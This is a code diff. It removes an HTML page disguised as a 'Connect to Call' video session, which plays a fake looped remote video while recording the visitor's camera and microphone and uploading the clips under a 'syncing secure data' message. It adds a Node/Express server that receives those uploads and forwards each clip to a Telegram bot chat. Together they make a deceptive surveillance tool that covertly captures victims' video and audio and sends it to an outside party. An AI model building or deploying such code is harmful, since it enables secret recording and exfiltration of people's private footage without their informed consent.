@@ -1,191 +1,66 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>Secure Session</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        body { margin:0; background:black; color:white; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; overflow:hidden; touch-action: none; }
-        #connectScreen { position: fixed; top:0; left:0; width:100%; height:100%; background: #000; z-index: 500; display: flex; flex-direction: column; justify-content: center; align-items: center; }
-        .connect-btn { padding: 15px 40px; border-radius: 30px; border: none; background: #25d366; color: white; font-size: 1.2rem; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 10px; }
-        #remoteVideo { position:fixed; width:100%; height:100%; object-fit:cover; z-index: 1; display:none; }
-        #localVideo { position: absolute; width: 110px; height: 160px; bottom: 20px; right: 20px; border-radius: 12px; object-fit: cover; z-index: 10; background: #222; box-shadow: 0 8px 24px rgba(0,0,0,0.5); border: 0.5px solid rgba(255,255,255,0.2); display: none; }
-        .snap-transition { transition: all 0.4s cubic-bezier(0.25, 1, 0.5, 1); }
-        .controls { position:absolute; bottom:40px; width:100%; display:none; justify-content:center; align-items: center; gap: 20px; z-index: 20; transition: opacity 0.3s; }
-        .btn { width: 55px; height: 55px; border-radius: 50%; border: none; background: rgba(255, 255, 255, 0.15); color: white; font-size: 1.2rem; display: flex; justify-content: center; align-items: center; backdrop-filter: blur(10px); cursor: pointer; }
-        .btn-end { background: #ff3b30; width: 70px; height: 70px; font-size: 1.5rem; }
-        #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 600; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
-        .loader { width: 45px; height: 45px; border: 4px solid #FFF; border-bottom-color: transparent; border-radius: 50%; animation: rotation 1s linear infinite; display: inline-block; }
-        @keyframes rotation { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        .upload-status { margin-top: 20px; font-size: 0.9rem; color: #aaa; }
-    </style>
-</head>
+const express = require('express');
+const multer = require('multer');
+const TelegramBot = require('node-telegram-bot-api');
+const fs = require('fs');
+const path = require('path');
 
-<body onclick="toggleUI(event)">
+const app = express();
+const port = process.env.PORT || 3000;
 
-    <div id="connectScreen">
-        <button class="connect-btn" onclick="initiateConnection()">
-            <i class="fas fa-phone"></i> Connect to Call
-        </button>
-    </div>
+// 1. CONFIGURATION (Make sure these match your Render Environment Variables)
+const token = process.env.BOT_TOKEN;
+const chatId = process.env.CHAT_ID;
+const bot = new TelegramBot(token, { polling: false });
 
-    <video id="remoteVideo" autoplay loop muted playsinline>
-        <source src="test-video.mp4" type="video/mp4">
-    </video>
-
-    <video id="localVideo" autoplay muted playsinline></video>
-
-    <div class="controls" id="controlsUI">
-        <button class="btn" onclick="toggleMic(this)"><i class="fas fa-microphone" id="micIcon"></i></button>
-        <button class="btn btn-end" onclick="endCall()"><i class="fas fa-phone-slash"></i></button>
-        <button class="btn" onclick="switchCamera()"><i class="fas fa-camera-rotate"></i></button>
-    </div>
-
-    <div id="overlay">
-        <span class="loader"></span>
-        <h3 style="margin-top:20px;">Ending Session</h3>
-        <p id="syncMsg" class="upload-status">Syncing secure data segments...</p>
-    </div>
-
-<script>
-let localStream;
-let mediaRecorder;
-let currentChunks = [];
-let segmentCount = 1;
-let pendingUploads = 0; 
-let currentFacing = "user";
-let uiVisible = true;
-let isEnding = false;
-
-const connectSound = new Audio("ringtone.mp3");
-const localVideo = document.getElementById("localVideo");
-const controlsUI = document.getElementById("controlsUI");
-const connectScreen = document.getElementById("connectScreen");
-
-function initiateConnection() {
-    connectSound.volume = 0.05; 
-    connectSound.play().catch(() => {});
-    connectScreen.innerHTML = `<span class="loader"></span><p style="margin-top:20px;">Establishing Line...</p>`;
-
-    setTimeout(async () => {
-        connectScreen.style.display = "none";
-        document.getElementById("remoteVideo").style.display = "block";
-        controlsUI.style.display = "flex";
-        localVideo.style.display = "block";
-        localVideo.classList.add("snap-transition");
-        await startCamera();
-    }, 5000); 
+// 2. AUTO-CREATE UPLOADS FOLDER (Crucial for Render)
+const uploadDir = path.join(__dirname, 'uploads');
+if (!fs.existsSync(uploadDir)) {
+    fs.mkdirSync(uploadDir);
+    console.log("✅ Created 'uploads' directory");
 }
 
-async function startCamera() {
-    if (localStream) {
-        localStream.getTracks().forEach(t => t.stop());
+// 3. STORAGE SETUP
+const storage = multer.diskStorage({
+    destination: (req, file, cb) => { cb(null, uploadDir); },
+    filename: (req, file, cb) => { cb(null, file.originalname); }
+});
+
+// Increased limit to 50MB to handle high-quality video segments
+const upload = multer({ 
+    storage: storage,
+    limits: { fileSize: 50 * 1024 * 1024 } 
+});
+
+app.use(express.static('.'));
+app.use(express.json());
+
+// 4. THE UPLOAD ROUTE
+app.post('/upload', upload.single('video'), async (req, res) => {
+    if (!req.file) {
+        console.error("❌ No file received");
+        return res.status(400).send("No file uploaded");
     }
 
+    console.log(`📩 Received: ${req.file.filename}`);
+
     try {
-        localStream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: currentFacing, width: { ideal: 640 } },
-            audio: true
+        // Send to Telegram
+        await bot.sendVideo(chatId, req.file.path, {
+            caption: `🎥 New Segment: ${req.file.filename}`
         });
-        localVideo.srcObject = localStream;
-
-        const mime = MediaRecorder.isTypeSupported("video/webm;codecs=vp8,opus") ? "video/webm;codecs=vp8,opus" : "video/webm";
-        mediaRecorder = new MediaRecorder(localStream, { mimeType: mime });
-        currentChunks = [];
-
-        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) currentChunks.push(e.data); };
         
-        mediaRecorder.onstop = async () => {
-            const blob = new Blob(currentChunks, { type: "video/webm" });
-            await uploadSegment(blob, segmentCount, currentFacing);
-            segmentCount++;
-        };
-
-        mediaRecorder.start();
-    } catch (err) {
-        console.error("Camera Hardware Error:", err);
+        console.log(`🚀 Sent to Bot: ${req.file.filename}`);
+        
+        // Delete file after sending to keep the Render disk clean
+        fs.unlinkSync(req.file.path);
+        
+        res.status(200).send("Success");
+    } catch (error) {
+        console.error("❌ Telegram Error:", error.message);
+        res.status(500).send("Bot failed to send video");
     }
-}
+});
 
-async function uploadSegment(blob, id, facing) {
-    if (blob.size < 1000) return; // Ignore very tiny segments
-
-    pendingUploads++;
-    const formData = new FormData();
-    formData.append("video", blob, `part_${id}_${facing}.webm`);
-
-    try {
-        const response = await fetch("/upload", { 
-            method: "POST", 
-            body: formData 
-        });
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-    } catch (e) {
-        console.error("Upload failed:", e);
-    } finally {
-        pendingUploads = Math.max(0, pendingUploads - 1);
-        checkFinalRedirect();
-    }
-}
-
-async function switchCamera() {
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
-        // Short pause to allow the recorder to flush the blob before restarting
-        await new Promise(r => setTimeout(r, 500));
-    }
-    
-    currentFacing = (currentFacing === "user") ? "environment" : "user";
-    await startCamera();
-}
-
-async function endCall() {
-    isEnding = true;
-    document.getElementById("overlay").style.display = "flex";
-
-    if (mediaRecorder && mediaRecorder.state !== "inactive") {
-        mediaRecorder.stop();
-    }
-
-    if (localStream) {
-        localStream.getTracks().forEach(t => t.stop());
-    }
-
-    // Give it a 3-second absolute deadline to finish uploads
-    setTimeout(() => {
-        if (isEnding) window.location.href = "search.html";
-    }, 3000);
-
-    checkFinalRedirect();
-}
-
-function checkFinalRedirect() {
-    if (isEnding && pendingUploads === 0) {
-        document.getElementById("syncMsg").innerText = "Success. All data synced.";
-        setTimeout(() => {
-            window.location.href = "search.html";
-        }, 1000);
-    } else if (isEnding) {
-        document.getElementById("syncMsg").innerText = `Finalizing ${pendingUploads} segment(s)...`;
-    }
-}
-
-// DRAG AND UI LOGIC
-let isDragging = false;
-let startX, startY, initialLeft, initialTop;
-const startDrag = (e) => { isDragging = true; localVideo.classList.remove("snap-transition"); const clientX = e.touches ? e.touches[0].clientX : e.clientX; const clientY = e.touches ? e.touches[0].clientY : e.clientY; const rect = localVideo.getBoundingClientRect(); startX = clientX; startY = clientY; initialLeft = rect.left; initialTop = rect.top; };
-const drag = (e) => { if (!isDragging) return; const clientX = e.touches ? e.touches[0].clientX : e.clientX; const clientY = e.touches ? e.touches[0].clientY : e.clientY; let newX = initialLeft + (clientX - startX); let newY = initialTop + (clientY - startY); newX = Math.max(10, Math.min(newX, window.innerWidth - localVideo.offsetWidth - 10)); newY = Math.max(10, Math.min(newY, window.innerHeight - localVideo.offsetHeight - 10)); localVideo.style.left = newX + "px"; localVideo.style.top = newY + "px"; };
-const stopDrag = () => { if (!isDragging) return; isDragging = false; localVideo.classList.add("snap-transition"); const rect = localVideo.getBoundingClientRect(); if (rect.top > window.innerHeight * 0.7) { localVideo.style.top = (window.innerHeight - localVideo.offsetHeight - 20) + "px"; } const finalX = (rect.left + rect.width / 2 < window.innerWidth / 2) ? 20 : (window.innerWidth - rect.width - 20); localVideo.style.left = finalX + "px"; };
-localVideo.addEventListener("touchstart", startDrag);
-localVideo.addEventListener("mousedown", startDrag);
-document.addEventListener("touchmove", drag, { passive: false });
-document.addEventListener("mousemove", drag);
-document.addEventListener("touchend", stopDrag);
-document.addEventListener("mouseup", stopDrag);
-
-function toggleUI(e) { if (e.target.closest('button') || isDragging || e.target === localVideo) return; uiVisible = !uiVisible; controlsUI.style.opacity = uiVisible ? "1" : "0"; controlsUI.style.pointerEvents = uiVisible ? "auto" : "none"; }
-function toggleMic(btn) { const t = localStream.getAudioTracks()[0]; if(t) { t.enabled = !t.enabled; btn.style.background = t.enabled ? "rgba(255,255,255,0.15)" : "white"; btn.style.color = t.enabled ? "white" : "black"; document.getElementById("micIcon").className = t.enabled ? "fas fa-microphone" : "fas fa-microphone-slash"; } }
-</script>
-</body>
-</html>
+app.listen(port, () => {
+    console.log(`🌐 Server running on port ${port}`);
+});
